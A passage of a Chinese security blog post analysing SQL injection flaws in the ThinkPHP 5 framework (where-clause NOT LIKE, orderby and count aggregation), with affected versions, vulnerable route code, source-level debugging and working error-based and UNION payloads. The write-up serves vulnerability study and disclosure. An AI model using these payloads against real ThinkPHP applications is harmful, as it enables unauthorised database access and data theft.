                            $bindKey = $bindName . '_in_' . $i;
                        }
                        $bind[$bindKey] = [$v, $bindType];
                        $array[]        = ':' . $bindKey;
                    }
                    $this->query->bind($bind);
                    $zone = implode(',', $array);
                } else {
                    $zone = implode(',', $this->parseValue($value, $field));
                }
                $whereStr .= $key . ' ' . $exp . ' (' . (empty($zone) ? "''" : $zone) . ')';
            }
        } elseif (in_array($exp, ['NOT BETWEEN', 'BETWEEN'])) {
            // BETWEEN 查询
            $data = is_array($value) ? $value : explode(',', $value);
            if (array_key_exists($field, $binds)) {
                if ($this->query->isBind($bindName . '_between_1')) {
                    $bindKey1 = $bindName . '_between_1' . uniqid();
                    $bindKey2 = $bindName . '_between_2' . uniqid();
                } else {
                    $bindKey1 = $bindName . '_between_1';
                    $bindKey2 = $bindName . '_between_2';
                }
                $bind = [
                    $bindKey1 => [$data[0], $bindType],
                    $bindKey2 => [$data[1], $bindType],
                ];
                $this->query->bind($bind);
                $between = ':' . $bindKey1 . ' AND :' . $bindKey2;
            } else {
                $between = $this->parseValue($data[0], $field) . ' AND ' . $this->parseValue($data[1], $field);
            }
            $whereStr .= $key . ' ' . $exp . ' ' . $between;
        } elseif (in_array($exp, ['NOT EXISTS', 'EXISTS'])) {
            // EXISTS 查询
            if ($value instanceof \Closure) {
                $whereStr .= $exp . ' ' . $this->parseClosure($value);
            } else {
                $whereStr .= $exp . ' (' . $value . ')';
            }
        } elseif (in_array($exp, ['< TIME', '> TIME', '<= TIME', '>= TIME'])) {
            $whereStr .= $key . ' ' . substr($exp, 0, 2) . ' ' . $this->parseDateTime($value, $field, $options, $bindName, $bindType);
        } elseif (in_array($exp, ['BETWEEN TIME', 'NOT BETWEEN TIME'])) {
            if (is_string($value)) {
                $value = explode(',', $value);
            }
    
            $whereStr .= $key . ' ' . substr($exp, 0, -4) . $this->parseDateTime($value[0], $field, $options, $bindName . '_between_1', $bindType) . ' AND ' . $this->parseDateTime($value[1], $field, $options, $bindName . '_between_2', $bindType);
        }
        return $whereStr;
    }
    

在开头，会对传入的数据进行一个类型的判断，我们先来看一下传入字符串而不是数组的情况。

    
    
    if (!is_array($val)) {
        $val = ['=', $val];
    }
    

随后对操作符进行检测，传入字符串时默认为 `=`，在数组中，所以不进入if。

    
    
    if (!in_array($exp, $this->exp)) {
        $exp = strtolower($exp);
        if (isset($this->exp[$exp])) {
            $exp = $this->exp[$exp];
        } else {
            throw new Exception('where express error:' . $exp);
        }
    }
    

然后下面会进入这个判断，`$value` 的值就变为了 `:where_username`。

    
    
    if (is_scalar($value) && array_key_exists($field, $binds) && !in_array($exp, ['EXP', 'NOT NULL', 'NULL', 'IN', 'NOT IN', 'BETWEEN', 'NOT BETWEEN']) && strpos($exp, 'TIME') === false) {
        if (strpos($value, ':') !== 0 || !$this->query->isBind(substr($value, 1))) {
            if ($this->query->isBind($bindName)) {
                $bindName .= '_' . str_replace('.', '_', uniqid('', true));
            }
            $this->query->bind($bindName, $value, $bindType);
            $value = ':' . $bindName;
        }
    }
    

下面就是操作符的不同而进入不同的分支了，这里的操作符是 `=` ，所以会进入下面这个判断中的else，最后`$whereStr` 的值就为
``username` = :where_username`。

    
    
    if (in_array($exp, ['=', '<>', '>', '>=', '<', '<='])) {
        // 比较运算
        if ($value instanceof \Closure) {
            $whereStr .= $key . ' ' . $exp . ' ' . $this->parseClosure($value);
        } else {
            $whereStr .= $key . ' ' . $exp . ' ' . $this->parseValue($value, $field);
        }
    }
    

往下SQL语句就成了 `"SELECT * FROM `user` WHERE `username` = :where_username
"`，到这已经不用往下看了，接下来就是预处理然后执行SQL语句了，无法进行注入。

那我们再来看看传入数组的情况，还是来到 `parseWhereItem()`。这里的 `username[0]=not like`
不管是大写还是小写都可以，都会被转化为大写。然后在根据操作符不同判断分支时会进入第二个分支。

    
    
    elseif ('LIKE' == $exp || 'NOT LIKE' == $exp) {
        // 模糊匹配
        if (is_array($value)) {
            foreach ($value as $item) {
                $array[] = $key . ' ' . $exp . ' ' . $this->parseValue($item, $field);
            }
            $logic = isset($val[2]) ? $val[2] : 'AND';
            $whereStr .= '(' . implode($array, ' ' . strtoupper($logic) . ' ') . ')';
        } else {
            $whereStr .= $key . ' ' . $exp . ' ' . $this->parseValue($value, $field);
        }
    }
    

这里会对 `username[1]` 也就是 `$value` 进行一个类型的判断数组的话进入if，并对其进行一个拼接，`$logic` 被赋值为
`$username[2]` 的值，`$whereStr` 会等于`(`username` NOT LIKE '%' ) UNION SELECT
1,114514,DATABASE()# `username` NOT LIKE 'So4ms')`，返回之后直接拼接到了SQL语句中，就造成了注入。

而我们传入的参数的位置也就是这样的：`(`username` NOT LIKE '$username[1][0]' $username[2]
`username` NOT LIKE '$username[1][1]')`

这里本来使用 `LIKE` 也是同样的流程，但是使用 `request()->get()` 来获取参数的话会有下面这样一个过滤， `LIKE` 会过滤为
`LIKE` ，多了一个空格，就不满足上面的条件了，所以使用 `NOT LIKE`。

    
    
    public function filterExp(&$value)
    {
        // 过滤查询特殊字符
        if (is_string($value) && preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i', $value)) {
            $value .= ' ';
        }
        // TODO 其他安全过滤
    }
    

在小于5.0.10的版本中，只能使用大写的 `NOT LIKE` 而不能用小写，因为在 `parseWhereItem()`
中，有一个操作符的判断，如果不在给定的数组的值中，就会对键进行匹配，而在小于5.0.10的版本中，`NOT LIKE` 的 键为 `notlike`，即
`notlike:"NOT LIKE"`，所以 `not like` 不能成功执行，同时 `NOTLIKE` 在 `request()->get()`
中也被过滤了，所以只能使用 `NOT LIKE`，所以网上挺多这个漏洞只存在于5.0.10的说法是不对的。

    
    
    // 检测操作符
    if (!in_array($exp, $this->exp)) {
        $exp = strtolower($exp);
        if (isset($this->exp[$exp])) {
            $exp = $this->exp[$exp];
        } else {
            throw new Exception('where express error:' . $exp);
        }
    }
    

## 0x06 ThinkPHP v5 orderby 注入

###  0x00 影响范围

> ThinkPHP 5.1.16-5.1.22

###  0x01 演示版本

ThinkPHP v5.1.22  
PHP: php 7.3.4  
环境：Windows10

###  0x02 payload

`?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1`

###  0x03 触发条件

添加一个路由进行查询。

    
    
    public function sql()
    {
        $orderby = request()->get('orderby');
        $result = db('user')->where(['username' => 'admin'])->order($orderby)->find();
        print_r($result);
    }
    

使用报错注入需开启debug。

###  0x04 调试分析

在 `order()` 方法处打下断点，看看正常情况下传入 `orderby=1` 的情况。

    
    
    public function order($field, $order = null)
    {
        if (empty($field)) {
            return $this;
        } elseif ($field instanceof Expression) {
            $this->options['order'][] = $field;
            return $this;
        }
    
        if (is_string($field)) {
            if (!empty($this->options['via'])) {
                $field = $this->options['via'] . '.' . $field;
            }
    
            if (strpos($field, ',')) {
                $field = array_map('trim', explode(',', $field));
            } else {
                $field = empty($order) ? $field : [$field => $order];
            }
        } elseif (!empty($this->options['via'])) {
            foreach ($field as $key => $val) {
                if (is_numeric($key)) {
                    $field[$key] = $this->options['via'] . '.' . $val;
                } else {
                    $field[$this->options['via'] . '.' . $key] = $val;
                    unset($field[$key]);
                }
            }
        }
    
        if (!isset($this->options['order'])) {
            $this->options['order'] = [];
        }
    
        if (is_array($field)) {
            $this->options['order'] = array_merge($this->options['order'], $field);
        } else {
            $this->options['order'][] = $field;
        }
    
        return $this;
    }
    

在第二个判断 `if (is_string($field))` 处显然是符合条件的，进入if，`$this->options['via']`
初始情况也是空的，来看下一个判断。

这里如果传入的参数带有逗号，就会以逗号为分隔符进行分割然后去掉首尾字符，否则由于这里 `$order` 默认为null，`$field` 等于自身。

    
    
    if (strpos($field, ',')) {
        $field = array_map('trim', explode(',', $field));
    } else {
        $field = empty($order) ? $field : [$field => $order];
    }
    

来到下面会判断是否为数组来进行不同的赋值。

    
    
    if (is_array($field)) {
        $this->options['order'] = array_merge($this->options['order'], $field);
    } else {
        $this->options['order'][] = $field;
    }
    

`order()` 结束了，跟进 `find()`，跟着调试一路跟进，在 `parseOrder()` 中，对输入的参数调用了 `parseKey()`
，如果是数字，那就返回数字本身，如果不是数字，那就接着往下，存在这样一个判断，满足条件会在两边加上反引号，这样的话如果我们直接进行注入，语句会被切割开分别加上反引号，显然我们是不能进行注入了。

    
    
    if ('*' != $key && ($strict || !preg_match('/[,\'\"\*\(\)`.\s]/', $key))) {
        $key = '`' . $key . '`';
    }
    

如果我们传入一个数组，在 `order()` 中，直接对 `options['order']` 赋值。

    
    
    if (is_array($field)) {
        $this->options['order'] = array_merge($this->options['order'], $field);
    } else {
        $this->options['order'][] = $field;
    }
    

然后在 `parseOrder()` 中，由于传入的键值不是之前切割字符串时的数字，所以会进入else，`key` 值就是键值，然后在线进入
`parseKey()` 。

    
    
    if (is_numeric($key)) {
        list($key, $sort) = explode(' ', strpos($val, ' ') ? $val : $val . ' ');
    } else {
        $sort = $val;
    }
    

这里虽然也会被加上反引号，但是整个注入语句都在一对反引号，我们是可以将其闭合的，前一个反引号配上一个列名进行闭合，后一个反引号我们可以直接将其注释，就有：``id`|updatexml(1,concat(0x7,user(),0x7e),1)#`
`，而且这里 `' ORDER BY ' . implode(',', $array);` 是直接将其拼接到字符串中没有进行额外过滤的，就造成了注入。

## 0x07 ThinkPHP v5 聚合查询注入

###  0x00 影响范围

> ThinkPHP 5.0.0-5.0.21  
>  ThinkPHP 5.1.3-5.1.25

###  0x01 演示版本

ThinkPHP v5.1.22  
PHP: php 7.3.4  
环境：Windows10

###  0x02 payload

`?count=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23`

###  0x03 触发条件

添加一个路由进行查询。

    
    
    public function sql()
    {
        $count = input('get.count');
        $result = db('user')->count($count);
        print_r($result);
    }
    

使用报错注入需开启debug。

###  0x04 调试分析

调用顺序 ：`count() => $this->aggregate() => $this->connection->aggregate()`。

此时看一下该方法的代码，`$aggregate` 是聚合方法，值为 `COUNT`，而 `$field` 是我们的输入，显然是要经过
`$this->builder->parseKey()` 进行处理，跟进看一下。

    
    
    public function aggregate(Query $query, $aggregate, $field)
    {
        $field = $aggregate . '(' . $this->builder->parseKey($query, $field, true) . ') AS tp_' . strtolower($aggregate);
    
        return $this->value($query, $field, 0);
    }
    

`$this->builder->parseKey()` 我们在上一个漏洞分析过了，在调用 `parseKey()` 时传入的参数 `$strict`
为true，所以我们的输入会被反引号包裹起来，然后返回结果，由于是整个字符串，且没有过滤，所以存在闭合的可能，返回的结果就为
`COUNT(`id`)+updatexml(1,concat(0x7,user(),0x7e),1) from user#`) AS tp_count`。

    
    
    if ('*' != $key && ($strict || !preg_match('/[,\'\"\*\(\)`.\s]/', $key))) {
        $key = '`' . $key . '`';
    }
    

然后调用了 `$this->value()` ，接着就是熟悉的调用 `$this->builder->select()`
生成查询SQL，由于我们的关注内容通过 `$query->setOption('field', $field);` 保存在
`$options['field']` ，所以我们跟进 `$this->parseField()`，这里又有 `$this->parseKey`
对切割开为数组的内容进行处理。

    
    
    protected function parseField(Query $query, $fields)
    {
        if ('*' == $fields || empty($fields)) {
            $fieldsStr = '*';
        } elseif (is_array($fields)) {
            // 支持 'field1'=>'field2' 这样的字段别名定义
            $array = [];
    
            foreach ($fields as $key => $field) {
                if (!is_numeric($key)) {
                    $array[] = $this->parseKey($query, $key) . ' AS ' . $this->parseKey($query, $field, true);
                } else {
                    $array[] = $this->parseKey($query, $field);
                }
            }
    
            $fieldsStr = implode(',', $array);
        }
    
        return $fieldsStr;
    }
    

还是这个判断，但是这里 `$strict` 为false，且数组每一个值都包含括号，所以不会加上反引号，也就是不会发生变化。

    
    
    if ('*' != $key && ($strict || !preg_match('/[,\'\"\*\(\)`.\s]/', $key))) {
        $key = '`' . $key . '`';
    }
    

随后 `$fieldsStr = implode(',', $array);` 拼接起来，最后拼接到SQL语句中，为 `SELECT
COUNT(`id`)+updatexml(1,concat(0x7,user(),0x7e),1) from user#`) AS tp_count
FROM `user` LIMIT 1`，注入成功。

## 0x08 参考资料

[Thinkphp v5.1.41反序列化漏洞分析及EXP ](https://www.freebuf.com/vuls/269882.html
"Thinkphp v5.1.41反序列化漏洞分析及EXP ")  
[
ThinkPHP5代码审计【未开启强制路由导致RCE】](https://blog.csdn.net/weixin_45669205/article/details/116724655
" ThinkPHP5代码审计【未开启强制路由导致RCE】")  
[ThinkPHP 5.0命令执行漏洞分析及复现](https://www.freebuf.com/vuls/194127.html "ThinkPHP
5.0命令执行漏洞分析及复现")  
[ Thinkphp5.0.15 SQL注入](https://blog.csdn.net/rfrder/article/details/114376727
" Thinkphp5.0.15 SQL注入")  
[ ThinkPHP5.x注入漏洞学习 ](https://www.cnblogs.com/R0ser1/p/15093687.html "
ThinkPHP5.x注入漏洞学习 ")  
[ Thinkphp 5.1.17
SQL注入](https://blog.csdn.net/rfrder/article/details/114388453 " Thinkphp
5.1.17 SQL注入")  
[ Thinkphp 5.0.10
SQL注入](https://blog.csdn.net/rfrder/article/details/114408324 " Thinkphp
5.0.10 SQL注入")

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **So4ms** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/252811](/post/id/252811)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [PHP](/tag/PHP)
  * [ThinkPHP](/tag/ThinkPHP)
  * [漏洞复现](/tag/漏洞复现)

 **+1** __4赞

 __收藏

![](https://thirdqq.qlogo.cn/g?b=oidb&k=4ibibT4CQGVvl7U5aIuddKsg&s=40&t=1607620251)
So4ms

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

